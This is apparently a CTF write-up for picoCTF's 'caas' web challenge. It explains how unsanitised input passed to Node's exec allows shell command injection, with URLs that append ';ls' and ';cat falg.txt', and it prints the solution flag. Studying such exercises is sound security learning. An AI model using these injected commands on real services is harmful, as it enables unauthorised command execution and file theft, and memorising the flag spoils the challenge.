# caas

## Description

**POINT: 150 points**

Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)

## HINT

(None)

#### Challenge Endpoints

Download [index.js](https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js)

## Approach

![Screenshot from 2023-11-04 15-45-27](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/c15712d5-5e6a-4fad-8733-68c861a9b788)

download the index.js file

![Screenshot from 2023-11-04 15-57-56](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/ee805987-14c4-4a56-885a-4869b104524e)

From this code we can know that uses dangerous function called `exec` we can run shell commands

![Screenshot from 2023-11-04 15-47-47](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/d56040b2-e52b-4068-aeb7-4c91583a5024)

And if there is any user input reflected inside this function, we can execute shell commands.

In above code `exec('/usr/games/cawsay ${req.params.message}')` this line take our input from parameter called `message` and pass it to `/usr/games/cowsay` and print this shape with our input

    https://caas.mars.picoctf.net/cowsay/our%20massage

![Screenshot from 2023-11-04 16-12-53](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/593e550b-0e81-4b95-acd8-96d5a8d5a403)

And we can inject our shell command with this 

    https://caas.mars.picoctf.net/cowsay/test;ls

the code will do inside `exec` function like this 

    exec('/usr/games/cawsay test;ls')

this code will do his job and do `ls` command after do his job

![Screenshot from 2023-11-04 16-20-18](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/52c16a9a-3028-4f75-b228-4265b2b2f570)

And get our flag 

    https://caas.mars.picoctf.net/cowsay/test;cat%20falg.txt
    or
    curl 'https://caas.mars.picoctf.net/cowsay/test;cat%20falg.txt/'

![Screenshot from 2023-11-04 15-53-08](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/61fcd9cb-078e-48e3-b62a-003fdc52e888)

# Flag

**picoCTF{mooooooooooooooooooooooooooooooooooooooooooooooooo

ooooooooooo0os}**
